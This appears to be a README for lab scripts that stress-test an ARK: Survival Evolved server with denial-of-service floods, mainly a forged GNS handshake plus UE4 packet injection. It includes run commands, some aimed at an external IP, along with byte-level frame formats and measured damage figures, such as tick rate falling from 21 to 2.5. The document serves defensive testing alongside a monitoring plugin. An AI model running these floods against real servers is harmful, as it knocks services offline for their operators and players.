# Lab scripts — ARK: Survival Evolved v358, Server2 bench

All scripts are Python 3 (on the bench: `C:\Program Files\Python314\python.exe`).
Before running in a PowerShell console: `$env:PYTHONIOENCODING='utf-8'`, otherwise
script messages die with `UnicodeEncodeError` (console is cp1252).

Target bench: `192.168.8.218` — game port `7778`, Steam query `27016`,
NetGuard plugin metrics at `127.0.0.1:27101` (JSON over TCP).
RCON is **not** used as an attack surface (administration only).

---

## 0. Quick start

```powershell
$env:PYTHONIOENCODING='utf-8'
cd C:\Dev\_research\security

# full run of all scenarios + final vector ranking by power
python ark_lab_suite.py --all --seconds 12 --json out\suite.json

# only the main vector (GNS session forgery + UE4 packet injection)
python ark_lab_gns_amp.py --count 200000

# external server (the pre-check will pass via its query port)
python ark_lab_gns_amp.py --host 23.109.45.13 --game-port 25714 --query-port 25715 --no-metrics --count 200000

# measure the impact on a remote server (no plugin there -> RTT to its query port)
python ark_lab_remote_probe.py --host 23.109.45.13 --query-port 25715 --seconds 40 --interval 0.2

# current server metrics
python ark_lab_metrics.py status
```

---

## 1. Main vector: GNS session forgery → «1 packet = 1 `UNetConnection`»

| Script | What it does |
|---|---|
| **`ark_lab_gns_amp.py`** | **the main amplifier — the file is SELF-CONTAINED (Python standard library only, can be copied to any host).** It implements the entire vector: a protobuf encoder, both stages of the GNS handshake, data-packet assembly and impact measurement. It exports `run_amp()`, which the suite calls. **Before the attack it automatically checks server availability** (an A2S ping of the query port + the game port's response to a `ChallengeRequest` + availability of the metrics plugin) and refuses to run with exit code 3 if the game port does not answer. |
| `ark_lab_gns_ue4_v2.py` | A variant with an explicit real UE4 handshake (4 packets) and parsing of server responses — for protocol debugging. |
| `ark_lab_gns_connect.py` | Stage 2 separately: `ConnectRequest` without `cert` → `ConnectOK` (prints all response fields). |
| `ark_lab_gns_probe.py` | Stage 1 separately: `ChallengeRequest` → `ChallengeReply` (shows the issued challenge). |
| `ark_lab_gns_conn_flood.py` | Flood of anonymous `ConnectRequest` from N ports: checking the "1 connection per (IP:port)" limit, server responses/rejections, memory. |
| `ark_lab_gns_challenge_flood.py` | Flood of `ChallengeRequest`: how many replies the server gives and whether it creates state (it does not). |

Frame format (recovered byte by byte, see `ARK_SPECIFIC_VECTORS.md` §13–14):

```
[0x20][u16 len][protobuf][pad→512]   ChallengeRequest  ->  [0x21] ChallengeReply
[0x22][protobuf]                      ConnectRequest    ->  [0x23] ConnectOK
[0x80][u32 to_conn_id][u16 seq][0x37][u32 msg_num][UE4 bytes]   data packets
```

Pre-check (runs automatically before the attack):

```
SERVER AVAILABILITY CHECK
  query port (A2S)   : ANSWERED, 9 B [....A....]
  game port (GNS)    : ANSWERED, challenge=0x693193fec5e4e8f4, protocol V5
  metrics plugin     : available (pid=18564, tps=21.5, uptime=10493)
```

If the game port does not answer — the attack is not launched, exit code 3.
Disable the check: `--skip-check`.

Example output of `ark_lab_gns_amp.py --count 200000`:

```
our address: 0.0.0.0:63952
GNS connection forged, server_connection_id=0x2ff0a4cc
before : connAttempts=200000 ... tps=21.5
  t=  1.0 s  sent=26192  connAttempts=226192  tps=21.6
  ...
after : connAttempts=240000 (+40000, i.e. 24596 connections/s)  tps=21.5
```

---

## 2. Intercept analysis (was needed to remove the barrier)

| Script | What it does |
|---|---|
| `ark_lab_gns_relay.py` | UDP relay `127.0.0.2:7778` → `192.168.8.218:7778` with logging: this is how the real client's handshake was intercepted (it turned out the client sends `ConnectRequest` **without** `cert`/`crypt`). |
| `ark_lab_gns_analyze.py` | Intercept analysis: message types, `ChallengeReply`, `ConnectRequest` (cert/crypt), `ConnectOK`, `ConnectionClosed`. |
| `ark_lab_gns_datapkt.py` | Analysis of GNS data packets: the `UDPDataMsgHdr` header, `to_connection_id`, packet numbers, size distribution. |
| `ark_lab_gns_align.py` | Layer alignment: GNS payload ↔ UE4 packets (used to recover the internal framing). |
| `ark_lab_sniff_gns.py` | Raw UDP sniffer (`SIO_RCVALL`) — **requires administrator rights**. |
| `ark_lab_replay_probe.py` | Replay of a real UE4 packet: the server drops it (the transport barrier is real). |
| `ark_lab_remote_probe.py` | External probe of a **remote** server's state: RTT to its query port (there is no NetGuard plugin on a foreign server, so the state is measured indirectly). Used to test the vector on the external bench 23.109.45.13:25714. |
| `ark_lab_handshake_capture.py` | An early version of the handshake intercept. |

---

## 3. Baseline vectors (for comparison in the ranking)

| Script | What it does |
|---|---|
| `ark_lab_loadtest.py` | Universal load generator: scenarios `query`, `query-flood`, `game-flood`, `suite`; `--pps`, `--duration`, `--threads`, `--payload-size`. |
| `ark_lab_fps_saturate.py` | Multi-source saturator of the game port (several sources) + FPS curve. |
| `ark_lab_fps_hunt.py`, `ark_lab_fpsdrop.py` | Finding the TPS degradation threshold at different rates/packet sizes. |
| `ark_lab_a2s_hunt.py`, `a2s_diag.py`, `a2s_probe_shapes.py` | A2S/Steam query: request shapes, response amplification (x15), diagnostics. |
| `ark_lab_deadconn.py` | "Dead" connections: how long a connection lives until it is closed. |
| `ark_lab_l7_probe.py` | L7 surfaces (`ServerCheat` etc.) at the application level. |
| `ark_lab_net.py` | Network primitives (UDP/TCP helpers). |
| `ark_lab_watch.py` | Real-time metric watching. |
| `rcon_cmd.py` | **Administration only** (RCON). RCON was not tested as an attack surface. |

---

## 4. Metrics and the plugin

| Script | What it does |
|---|---|
| `ark_lab_metrics.py` | TCP client of the NetGuard plugin: `status`, `ping`, `reset`, `config`, `defense on|off`. Used by all the other scripts. |

Plugin: `C:\Dev\ARK-Server-Plugins\NetGuard\` → installed into
`C:\asmdata\Servers\Server2\ShooterGame\Binaries\Win64\ArkApi\Plugins\NetGuard\`.
Provides `tps`, `tickMs`, `memKB`, `liveConnections`, `connectionAttempts`,
`connectionsRejected`, `preLoginAttempts`, `logins`, `players`, `newConnsPerSec` etc.

---

## 5. Suite and ranking

`ark_lab_suite.py` — runs five scenarios (S1 junk, S2 `ChallengeRequest`,
S3 `ConnectRequest`, S4 GNS+UE4 forgery, S5 A2S) and prints the ranking by power:

```
#   vector                              packets      pps   TPS before  TPS min TPS after  power  cost(packets)
1   S4 GNS forgery + UE4 injection       254000    25221     21.1      2.5     19.8       88%     100000
2   S2 GNS ChallengeRequest flood        174400    17392     21.5     21.0     21.2        2%          -
3   S1 junk flood 7778                   432000    43103     21.4     21.0     21.2        2%          -
4   S3 GNS ConnectRequest flood          139024    13864     21.1     20.8     21.1        1%          -
5   S5 Steam-query flood 27016           428000    42794     21.1     21.0     21.0        0%          -
```

S4 is implemented in a separate file `ark_lab_gns_amp.py`; the suite calls its function
`run_amp()` (the implementation is not duplicated).

### 5.1 Strict measurement by FPS (control scenarios)

`ark_lab_gns_fps_test.py` — scenarios C0 (idle), C1 (junk), C2 (GNS + junk in
data), C3 (GNS + UE4 handshake). Key result: **C2 degrades the same way as C3**
⇒ the effect comes from processing a GNS data packet, not from creating connections.

`ark_lab_gns_cost.py` — the cost of packet variants by the server process's CPU
(GetProcessTimes):

| variant | µs/packet |
|---|---|
| junk 64 B | **10.6** |
| GNS data, 1 unreliable frame (payload 6/64/512/1400 B) | 20–24 (payload size does not matter) |
| GNS data, 1 reliable frame | 20.1 |
| GNS data, 10 unreliable frames | 29.1 |
| **GNS data, 10 reliable frames** | **39.8** ← the most expensive |
| GNS ack frame | 28.3 |

Degradation threshold: ~25 000 pps of valid GNS data packets (TPS 21.7 → 2.5);
junk requires ~242 000 pps — **10 times more expensive**.

### 5.2 GNS data-packet variants (`--variant`)

`ark_lab_gns_amp.py --variant <name>` and `ark_lab_variant_compare.py` (comparing
variants by FPS locally / by losses on the query port remotely).

| Variant | CPU µs/packet | Connections | TPS min | Outcome |
|---|---|---|---|---|
| `unreliable` (0x37, 1 frame) | 20–25 | +120 000 | **2.6** | **effective** |
| `unreliable-x10` (10 frames) | 29 | +120 000 | **2.7** | effective (the same) |
| `blob` (0x81 + protobuf) | 23 | +120 000 | **2.7** | effective |
| `mixed` (0x37+0x40+0x90) | 21 | +120 000 | **2.7** | effective |
| `reliable` (0x40) | 20 | 0 | 21.1 | **no effect** |
| `reliable-x10` | 40 | 0 | 21.1 | **no effect** (the most expensive by CPU and useless) |
| `ack` (0x90) | 28 | 0 | 21.1 | **no effect** |

Conclusion: the degradation comes from **creating `UNetConnection`** (an unreliable frame
reaches UE4 as a stateless-connect); reliable/ack frames are processed only by the
transport, create no connections and do not drop FPS. So the most profitable packet is
**a plain unreliable frame, 18 bytes**.

```powershell
# locally: comparing variants by FPS
python -u C:\Dev\_research\security\ark_lab_variant_compare.py --count 120000 --seconds 10

# remotely: comparing by losses on the query port (the signal is drowned in WAN noise)
python -u C:\Dev\_research\security\ark_lab_variant_compare.py --host 23.109.45.13 \
    --game-port 25714 --query-port 25715 --count 150000 --seconds 10 --remote
```

Note: the `tps` metric is updated on the game tick, so under heavy degradation it
"lags" — the damage is visible only after the flood (in the table this is the
`TPS after` column).

S4 modes:

```powershell
# peak damage (continuous stream, ~25k pps) -> TPS 21.1 -> 2.5, power 88%
python ark_lab_gns_amp.py --count 200000

# the "cost" of the attack: the collapse starts at 100 000 packets
python ark_lab_gns_amp.py --stepped --burst 20000 --duration 60
```

---

## 6. Reports

* `ARK_SPECIFIC_VECTORS.md` — the game-specific vectors (N1–N7); §10–§12 —
  L7, slots; §13 — the GNS transport; §14 — implementation of the main vector;
  §15 — the ranking.
* `REPORT_ARK_SE_SECURITY.md` — the consolidated report: the stack, measurements,
  the vector table (V1–V7), the plugin, the lab scripts, defense recommendations.
